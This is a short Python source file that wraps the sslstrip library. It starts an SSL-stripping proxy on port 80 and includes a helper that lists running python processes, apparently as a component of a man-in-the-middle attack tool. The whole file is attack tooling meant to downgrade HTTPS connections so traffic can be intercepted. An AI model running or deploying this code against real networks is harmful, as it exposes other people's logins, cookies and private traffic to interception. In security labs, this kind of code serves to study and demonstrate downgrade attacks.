from twisted.internet import reactor
from twisted.web import http

from sslstrip.sslstrip.StrippingProxy import StrippingProxy
from sslstrip.sslstrip.URLMonitor import URLMonitor
from sslstrip.sslstrip.CookieCleaner import CookieCleaner

import sys
import subprocess as sp
from os import devnull

URLMonitor.getInstance().setFaviconSpoofing(False)
CookieCleaner.getInstance().setEnabled(False)

strippingFactory          = http.HTTPFactory(timeout=10)
strippingFactory.protocol = StrippingProxy

def sslStripping():

    print("\nSSL stripping listening on port 80\n")

    reactor.listenTCP(80, strippingFactory)
    reactor.run()
    
    return

def stopStripping():

    stopProcess = sp.Popen("ps aux".split(),stdout=sp.PIPE,stderr=sp.PIPE)
    (stopProcessOut,_) = stopProcess.communicate()

    spOutSplit = stopProcessOut.split("\n")
    # spOutPruned = [process for process in spOutSplit if "python" in process]

    for process in spOutSplit:
        if "python" in process:
            print("\n"+process)

    return
